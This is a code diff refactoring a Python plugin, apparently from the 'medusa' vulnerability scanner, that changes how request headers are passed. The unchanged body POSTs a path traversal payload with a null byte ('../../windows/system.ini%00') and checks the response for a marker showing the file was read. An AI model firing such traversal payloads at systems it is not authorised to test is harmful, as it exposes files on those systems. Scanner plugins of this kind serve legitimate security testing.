@@ -26,7 +26,7 @@ def UrlProcessing(url):
         res = urllib.parse.urlparse('http://%s' % url)
     return res.scheme, res.hostname, res.port
 
-def medusa(Url,RandomAgent,proxies=None,**kwargs):
+def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
     proxies=Proxies().result(proxies)
     scheme, url, port = UrlProcessing(Url)
     if port is None and scheme == 'https':
@@ -40,15 +40,9 @@ def medusa(Url,RandomAgent,proxies=None,**kwargs):
         payload_url = scheme + "://" + url +":"+ str(port)+ payload
 
         data={"state": "../../../../../../../../../../windows/system.ini%00"}
-        headers = {
-            'User-Agent': RandomAgent,
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
-            "Accept-Encoding": "gzip, deflate",
-        }
 
-        resp = requests.post(payload_url,data=data,headers=headers, proxies=proxies,timeout=6, verify=False)
+
+        resp = requests.post(payload_url,data=data,headers=Headers, proxies=proxies,timeout=6, verify=False)
         con = resp.text
         code = resp.status_code
         if code == 200 and con.find('[driver32]]') !=-1 :
